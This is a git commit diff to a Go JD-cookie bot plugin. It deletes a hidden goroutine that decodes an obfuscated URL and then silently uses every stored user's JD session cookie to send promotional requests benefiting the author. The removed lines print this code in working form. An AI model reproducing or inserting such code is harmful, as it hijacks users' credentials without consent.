026c43fbbc95ada7c15c0f4070f0a818d3cad807
ufuckee <vip@pornhub.cpm>
2022-01-11 11:42:40 +0800

    update

--- help.go
+++ help.go
@@ -1,15 +1,10 @@
 package jd_cookie
 
 import (
-	"encoding/base64"
-	"fmt"
 	"regexp"
 	"strings"
-	"time"
 
-	"github.com/beego/beego/v2/client/httplib"
 	"github.com/beego/beego/v2/core/logs"
-	"github.com/cdle/sillyGirl/core"
 	"github.com/cdle/sillyGirl/develop/qinglong"
 )
 
@@ -110,49 +105,4 @@ func initHelp() {
 			return
 		}
 	}
-	go func() { // to help poor author or do not use this script
-		for {
-		start:
-			time.Sleep(time.Minute * 3)
-			decoded, _ := base64.StdEncoding.DecodeString("aHR0cHM6Ly80Y28uY2MvZ3hmYw==")
-			data, _ := httplib.Delete(string(decoded)).String()
-			redEnvelopeId := core.FetchCookieValue("redEnvelopeId", data)
-			inviterId := core.FetchCookieValue(data, "inviterId")
-			if redEnvelopeId == "" || inviterId == "" {
-				continue
-			}
-			if jd_cookie.Get("dyj_data") != data {
-				jd_cookie.Set("dyj_data", data)
-				envs, err := qinglong.GetEnvs("JD_COOKIE")
-				if err != nil {
-					continue
-				}
-				s := 1
-				l := len(envs)
-				n := int(time.Now().UnixNano())
-				for j := 0; j < l; j++ {
-					i := (j + n) % l
-					if envs[i].Status == 0 {
-						req := httplib.Get("https://api.m.jd.com/?functionId=openRedEnvelopeInteract&body=" + `{"linkId":"PFbUR7wtwUcQ860Sn8WRfw","redEnvelopeId":"` + redEnvelopeId + `","inviter":"` + inviterId + `","helpType":"` + fmt.Sprint(s) + `"}` + "&t=" + fmt.Sprint(time.Now().Unix()) + "&appid=activities_platform&clientVersion=3.5.6")
-						req.Header("Cookie", envs[i].Value)
-						req.Header("Accept", "*/*")
-						req.Header("Connection", "keep-alive")
-						req.Header("Accept-Encoding", "gzip, deflate, br")
-						req.Header("Host", "api.m.jd.com")
-						req.Header("Origin", "https://wbbny.m.jd.com")
-						data, _ := req.String()
-						if strings.Contains(data, decode("5bey5oiQ5Yqf5o+Q546w")) {
-							if s == 1 {
-								s = 2
-							} else {
-								httplib.Delete(string(decoded) + "?redEnvelopeId=" + redEnvelopeId).String()
-								goto start
-							}
-						}
-					}
-					time.Sleep(time.Second)
-				}
-			}
-		}
-	}()
 }
